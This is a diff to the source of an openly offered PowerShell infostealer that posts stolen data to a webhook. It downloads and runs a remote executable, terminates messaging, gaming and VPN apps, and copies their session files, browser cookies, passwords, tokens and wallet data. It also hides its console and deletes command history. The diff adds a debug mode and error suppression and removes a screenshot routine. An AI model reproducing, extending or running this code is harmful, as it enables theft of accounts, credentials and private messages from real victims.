@@ -2,6 +2,7 @@
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
+$debug_mode = $false
 
 #fix for weird network stuff (chocolatey and other services use this exact line of code too (im just as cool))
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
@@ -44,7 +45,7 @@ function Invoke-ANTITOTAL {
         $url = $urls[$i]
         $functionName = $functions[$i]
         
-        $result = Invoke-WebRequest -Uri $url -Method Get
+        $result = Invoke-WebRequest -Uri $url
         if ($result.StatusCode -eq 200) {
             $content = $result.Content
             $function = Get-Command -Name $functionName
@@ -257,7 +258,6 @@ function EXFILTRATE-DATA {
     Invoke-surfsharkvpnstealer
 
     #other stuff
-    Invoke-ss
 
     $alldiskinfo = diskdata | ft -wrap -autosize
     $alldiskinfo > $folder_general\diskinfo.txt
@@ -355,14 +355,16 @@ function EXFILTRATE-DATA {
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
-    Stop-Process -Name discord -Force | Out-Null
-    Stop-Process -Name discordcanary -Force | Out-Null
-    Stop-Process -Name discordptb -Force | Out-Null
+    Stop-Process -Name discord -Force -ErrorAction SilentlyContinue | Out-Null
+    Stop-Process -Name discordcanary -Force -ErrorAction SilentlyContinue | Out-Null
+    Stop-Process -Name discordptb -Force -ErrorAction SilentlyContinue | Out-Null
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
 
     $main_temp = "$env:LOCALAPPDATA\Temp\"
+
+    Set-Location "$env:LOCALAPPDATA\Temp"
 
     Move-Item "$main_temp\browser-cookies.txt" $folder_general -Force
     Move-Item "$main_temp\browser-history.txt" $folder_general -Force
@@ -381,11 +383,6 @@ function EXFILTRATE-DATA {
     Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
     Remove-Item "$main_temp\main.exe" -Force
-    Remove-Item "$main_temp\browser-cookies.txt" -Force
-    Remove-Item "$main_temp\browser-history.txt" -Force
-    Remove-Item "$main_temp\browser-passwords.txt" -Force
-    Remove-Item "$main_temp\tokens.txt" -Force
-    Remove-Item "$main_temp\desktop-screenshot.png" -Force
 }
 
 
@@ -659,7 +656,7 @@ function Invoke-telegramstealer {
     $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
     if (!(Test-Path $path)) {return}
     $processname = "telegram"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $destination = "$folder_messaging\Telegram.zip"
     $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
     $files = Get-ChildItem -Path $path -Exclude $exclude
@@ -670,7 +667,7 @@ function Invoke-elementstealer {
     $elementfolder = "$env:userprofile\AppData\Roaming\Element"
     if (!(Test-Path $elementfolder)) {return}
     $processname = "element"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $element_session = "$folder_messaging\Element"
     New-Item -ItemType Directory -Force -Path $element_session
     Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
@@ -684,7 +681,7 @@ function Invoke-icqstealer {
     $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
     if (!(Test-Path $icqfolder)) {return}
     $processname = "icq"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $icq_session = "$folder_messaging\ICQ"
     New-Item -ItemType Directory -Force -Path $icq_session
     Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force
@@ -694,7 +691,7 @@ function Invoke-signalstealer {
     $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
     if (!(Test-Path $signalfolder)) {return}
     $processname = "signal"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $signal_session = "$folder_messaging\Signal"
     New-Item -ItemType Directory -Force -Path $signal_session
     Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
@@ -708,7 +705,7 @@ function Invoke-viberstealer {
     $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
     if (!(Test-Path $viberfolder)) {return}
     $processname = "viber"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $viber_session = "$folder_messaging\Viber"
     New-Item -ItemType Directory -Force -Path $viber_session
     $configfiles = @("config$1")
@@ -733,7 +730,7 @@ function Invoke-viberstealer {
 
 function Invoke-whatsappstealer {
     $processname = "whatsapp"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $whatsapp_session = "$folder_messaging\Whatsapp"
     New-Item -ItemType Directory -Force -Path $whatsapp_session
     $regexPattern = "WhatsAppDesktop"
@@ -751,7 +748,7 @@ function Invoke-steamstealer {
     $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
     if (!(Test-Path $steamfolder)) {return}
     $processname = "steam"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $steam_session = "$folder_gaming\Steam"
     New-Item -ItemType Directory -Force -Path $steam_session
     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -776,7 +773,7 @@ function Invoke-epicgames_stealer {
     $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
     if (!(Test-Path $epicgamesfolder)) {return}
     $processname = "epicgameslauncher"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $epicgames_session = "$folder_gaming\EpicGames"
     New-Item -ItemType Directory -Force -Path $epicgames_session
     Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
@@ -789,7 +786,7 @@ function Invoke-ubisoftstealer {
     $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
     if (!(Test-Path $ubisoftfolder)) {return}
     $processname = "upc"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $ubisoft_session = "$folder_gaming\Ubisoft"
     New-Item -ItemType Directory -Force -Path $ubisoft_session
     Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
@@ -800,7 +797,7 @@ function Invoke-electronic_arts {
     $eafolder = "$env:localappdata\Electronic Arts"
     if (!(Test-Path $eafolder)) {return}
     $processname = "eadesktop"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $ea_session = "$folder_gaming\Electronic Arts"
     New-Item -ItemType Directory -Force -Path $ea_session
     Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
@@ -810,7 +807,7 @@ function Invoke-protonvpnstealer {
     $protonvpnfolder = "$env:localappdata\protonvpn"
     if (!(Test-Path $protonvpnfolder)) {return}
     $processname = "protonvpn"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $protonvpn_account = "$folder_crypto\ProtonVPN"
     New-Item -ItemType Directory -Force -Path $protonvpn_account
     $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
@@ -832,26 +829,10 @@ function Invoke-surfsharkvpnstealer {
     $surfsharkvpnfolder = "$env:appdata\Surfshark"
     if (!(Test-Path $surfsharkvpnfolder)) {return}
     $processname = "Surfshark"
-    try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $surfsharkvpn_account = "$folder_crypto\Surfshark"
     New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
     Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
-}
-
-function Invoke-ss {
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-    $screens = [Windows.Forms.Screen]::AllScreens
-    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$folder_general\desktop-screenshot.png")
-    $graphics.Dispose()
-    $bmp.Dispose()
 }
 
 function Invoke-Crypto_Wallets {
@@ -957,7 +938,9 @@ function Search-Username ($usernames) {
 }
 
 if (Invoke-Admin_Check -eq $true) {
-    Hide-Console
+    if (!($debug_mode)) {
+        Hide-Console
+    }
     Remove-Item (Get-PSreadlineOption).HistorySavePath
     Invoke-ANTITOTAL
     # Self-Destruct
@@ -966,4 +949,8 @@ if (Invoke-Admin_Check -eq $true) {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
+}
+
+if $debug_mode {
+    Start-Sleep -s 10000
 }
